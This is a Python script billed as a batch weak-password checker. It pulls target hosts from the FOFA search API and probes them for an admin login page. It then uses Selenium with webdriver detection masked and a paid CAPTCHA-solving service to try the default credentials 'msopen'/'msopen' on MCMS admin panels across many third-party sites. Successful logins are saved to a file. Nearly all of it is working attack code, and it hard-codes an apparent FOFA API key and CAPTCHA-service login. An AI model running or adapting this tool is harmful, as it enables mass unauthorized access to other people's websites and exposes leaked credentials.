# !/usr/bin/python
# -*- coding:utf-8 -*-
# author: huayang
# time: 2021.7.2-2021.7.3
import requests
import base64
import json
import re
from selenium import webdriver
from chaojiying import Chaojiying_Client
import time

print("弱口令批量检测工具")
print("整体逻辑：通过fofa搜索获取相关ip，a.txt"
      "使用者需要修改添加相应后台地址，"
      "搜索完成后，会进行去重操作，再通过状态码，关键字确定网站后台是否存在，"
      "再使用selenium模块进行验证码识别模拟登录的操作"
      "获取登录成功后的网址如127.0.0.1/admin/login/index.php 中的admin字节与使用者输入的参数进行比对"
      "成功后写入的e.txt文件")
print("""\033[1;36m
 ______           __                       _______
|  ____|         / _|                      |   __ \\
| |__     ___   | |_    __ _               |  |__| |
|  __|   / _ \  |  _|  / _  |   ________   | _ ___/
| |     | (_) | | |   | (_| |  |________|  | |
|_|      \___/  |_|    \__,_|              |_|      ro
                        V:1.0          by:huayang                             
\033[0m""")


email = '1273292809@qq.com' #邮箱

key = '3fcc3d3717bdf7429bd28660761ad201' #key

query = base64.b64encode(input('查询语句:').encode('utf-8'))

query_sub = re.sub("[']",'',str(query))

size = '10000'

fields = 'host,title,ip,domain,port,country,province,city,country_name,header,server,protocol,banner,cert,isp,as_number,as_organization,latitude,longitude,icp'

api = 'https://fofa.so/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=%s&fields=%s' % (email,key,query_sub[1:],size,fields)

#time
localtime = time.localtime(time.time())

time = time.strftime("%Y%m%d%H%M%S", time.localtime())

response = requests.get(api)

#print(response.text)

if 'make sure email and apikey is correct' in response.text:
    print('\n\033[1;31m[-] 请检查邮箱或key是否有误\033[0m')

elif 'query statement error' in response.text:
    print('\n\033[1;31m[-] 查询语句错误\033[0m')

elif 'request params not valid' in response.text:
    print("\n\033[1;31m[-] 请求参数无效\033[0m")

elif 'FOFA coin is not enough' in response.text:
    print("\n\033[1;31m[-] F币不足\033[0m")

elif 'limits must less than' in response.text:
    print("\n\033[1;31m[-] 请求数必须小于1个达不溜\033[0m")

else:
    res = json.loads((response.content).decode('utf-8'))

    choice = 1
    if choice == '1':
        for i in range(len(res["results"])):
            url = res["results"][i][0]
            if 'http' not in url:
                url = 'http://' + url
                try:
                    response = requests.get(url, verify=False, timeout=2)
                    if response.status_code == 200:
                        print('\n\033[1;32m[+]正在写入:\033[0m', url)
                        with open(r'a.txt', 'a')as f:
                            f.write(str(url) + '\n')
                except:
                    pass
            else:
                try:
                    response = requests.get(url, verify=False, timeout=2)
                    if response.status_code == 200:
                        print('\n\033[1;32m[+]正在写入:\033[0m', url)
                        with open(time + '.txt', 'a')as f:
                            f.write(str(url) + '\n')
                except:
                    pass

    else:
        print('\033[1;31[-] 输入的参数有误\033[0m')

a=0
readDir = "a.txt"  #old
writeDir = "b.txt" #new
lines_seen = set()
outfile = open(writeDir, "w")
f = open(readDir, "r")
for line in f:
  if line not in lines_seen:
    a+=1
    outfile.write(line)
    lines_seen.add(line)
outfile.close()
print("文件去重成功")
dizhi=input('请输入后台地址（/admin/login）:')
zi = input('请输入后台关键字:')
o=0
for i in open("b.txt"):
    try:
        o=o+1
        print(o)
        a=i.replace("\n","")
        url=a+dizhi
        web=requests.get(url).status_code
        b=requests.get(url).content.decode("utf-8")
        if web==200 and zi in b:
            with open(r"c.txt", "a+") as f:
                f.write(url + "\n")
                f.close()
    except Exception:
        print("后台地址失败")
        continue
driver = webdriver.Chrome()
driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {

  "source": """
    Object.defineProperty(navigator, 'webdriver', {
      get: () => undefined
     })
  """
})

zifu = input('请输入后台登录成功后标识字符:')
for url in open("d.txt"):
    headers = {

        'Connection': 'close'

    }

    url=url.replace("\n","")
    driver.get(url)

    time.sleep(3)
    url = url.replace("\n", "")
    img = driver.find_element_by_xpath('/html/body/div/div/div/div[2]/div/form/div[3]/div[2]/img').screenshot_as_png
    chaojiying = Chaojiying_Client('xiaogouxion', 'xiaogouxion', '924150')
    '''更改自己超级鹰用户名，账号和数字'''
    dic = chaojiying.PostPic(img, 1902)
    yanzheng = dic['pic_str']
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="input-name"]').send_keys("msopen")
    driver.find_element_by_xpath('//*[@id="input-password"]').send_keys("msopen")
    driver.find_element_by_xpath('//*[@id="input-rand-code"]').send_keys(yanzheng)
    driver.find_element_by_xpath('/html/body/div/div/div/div[2]/div/button').click()
    time.sleep(3)
    a=driver.current_url

    web=a.split('/')[2]
    if web=='ms-mcms':
        with open(r"e.txt", "a+") as f:
            f.write(url + "\n")
            f.close()
    continue

